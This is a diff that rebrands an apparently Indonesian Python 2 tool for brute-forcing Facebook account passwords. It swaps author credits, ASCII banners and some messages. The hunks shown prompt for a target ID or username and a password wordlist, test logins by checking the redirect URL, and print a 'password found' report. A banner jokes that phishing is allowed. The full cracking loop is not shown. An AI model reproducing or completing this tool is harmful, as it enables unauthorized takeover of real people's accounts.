@@ -1,7 +1,7 @@
 #!usr
 # -*- coding: UTF-8 -*-
-# Mod by: MR.K7C8NG
-# team: life of programmer
+# coding by XbalMeonk
+# jangan recode cuk...
 
 
 import os
@@ -36,23 +36,23 @@ def runntxt(s):
 def banner():
     os.system('clear')
     print(" ")
-    print("     {}>>{}====================================={}>>   ").format(YY,GG,YY)
-    print("     {}||     {}TOOL'S    H4cK   FACEB00K      {} ||   ").format(GG,CC,GG)
-    print("     {}||        {} target   TERBARU           {} ||   ").format(GG,CC,GG)
-    print("    {} |+-------------------------------------+|   ").format(GG)
-    print("     {}||   {} AUTHOR    :{} Mr. Xbal Meonk      {} ||   ").format(GG,YY,CC,GG)
-    print("    {} ||   {} facebook  : {}Cengir Eea         {}  ||   ").format(GG,YY,CC,GG)
-    print("    {} ||   {} Youtube   :{} Xbal Meonk        {}   ||   ").format(GG,YY,CC,GG)
-    print("    {} |+-------------------------------------+|   ").format(GG)
-    print("   {}  ||  {}  kata mama phising boleh yang    {} ||   ").format(GG,CC,GG)
-    print("   {}  ||   {}   penting tetep SHOLAT...^_^    {} ||   ").format(GG,CC,GG)
-    print("     {}<<{}====================================={}<<   ").format(YY,GG,YY)
+    print("     {}>{}====================================={}>   ").format(YY,GG,YY)
+    print("     {}|     {}TOOL'S    H4cK   FACEB00K      {} |   ").format(GG,CC,GG)
+    print("     {}|        {} target   TERBARU           {} |   ").format(CC,CC,CC)
+    print("     {}|-------------------------------------|   ").format(CC)
+    print("     {}|   {} AUTHOR    {}:{} Mr. Xbal Meonk      {} |   ").format(CC,GG,CC,GG,CC)
+    print("     {}|   {} facebook  {}: {}Cengir Eea         {}  |   ").format(CC,GG,CC,BB,CC)
+    print("     {}|   {} Youtube   {}:{} Xbal Meonk        {}   |   ").format(CC,GG,CC,RR,CC)
+    print("     {}|-------------------------------------|   ").format(CC)
+    print("     {}|  {}  kata mama {}phising{} boleh yang    {} |   ").format(CC,YY,CC,YY,CC)
+    print("     {}|   {}   penting tetep {}SHOLAT...{}^_^    {} |   ").format(GG,YY,CC,YY,GG)
+    print("     {}<====================================={}<   ").format(YY,GG,YY)
     print("                                                 ")
 
 banner()
 
 print wd+"         Gunakan Dengan Bijak gan.. "
-print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
+print GG+"╭────\033[91m[\033[96m Masukkan No.id\033[95m / \033[96mUsername Target\033[91m ] "
 email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
 print " "
 print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
@@ -116,7 +116,7 @@ def iqbalz(iqbalz_password):
 	mask = tom.geturl()
 	if mask != login and (not 'login_attempt' in mask):
                         print " "
-			print ("\033[96m                S U C C E S S")
+			print ("\033[96m               B E R H A S I L")
 			print "          P A S S W O R D  F I N D "
                   	print RR+"+-------------------------------------------+"
 	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
@@ -141,29 +141,16 @@ def runn_noobs():
          global password_list
 
          lop = GG+"""
-                  `.-://////:-.`
-              .:+o+:-..````..-:+o+:.
-           `:o+-`                `:+o:`
-         `/o:`                      `:o/`
-        -s/`  .-..`            `..--` `/s-
-       /o.   `:.`.-:----------:-.``:-   .o/
-      /o`    .:`    `              --    `o/
-     -s.     .:`                   --     .s-
-     o/     .:`                     --     +o
-    .s-     :.                      `:`    -s`
-    .s.     :.                      `:`    .s.
-    .s-     --                      .:     -s.
-     o/     `-.                    `-.     /o
-     -s.     `--`                `.-`     .s-
-      /o` ----``..--..`    `...--.`      `o/
-       /o. `----`  `-.      `-.         .o/
-        -o:  -.......        ..       `:o-
-         `:o:``....--        ..     `:o:`
-           `:+/-`  `-        ..  `-/+:`
-              `-/+///..````..://+/-`
-                  `.-::////::-.` \033[91;1m
-                \033[90;1mLife Of Programmer\033[91;1m
-             Powered by:\033[97m MR.K7C8NG
+      ___     ___    ____       ____            
+      \  \   /  /   |    \    /     | 	S E D A N G
+       \  \ /  /    |  |\  \ /  /|  |   M E N G C R A C K..
+       /  / \  \    |  | \     / |  |
+      /__/   \__\   |__|  \___/  |__|
+      
+		  
+		  ` \033[91;1m
+                \033[90;1mSabar Cuk\033[91;1m
+             Powered by:\033[97m Mr.Xbal Meonk
       """
 
 
@@ -171,7 +158,7 @@ def runn_noobs():
          nuub = open(password_list, 'r')
          nuub = nuub.readlines()
          print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
-         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
+         print wd+" [#] Jumlah Password saat ini\033[97;1m:", len(nuub),'password'
          print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
          print " "
 
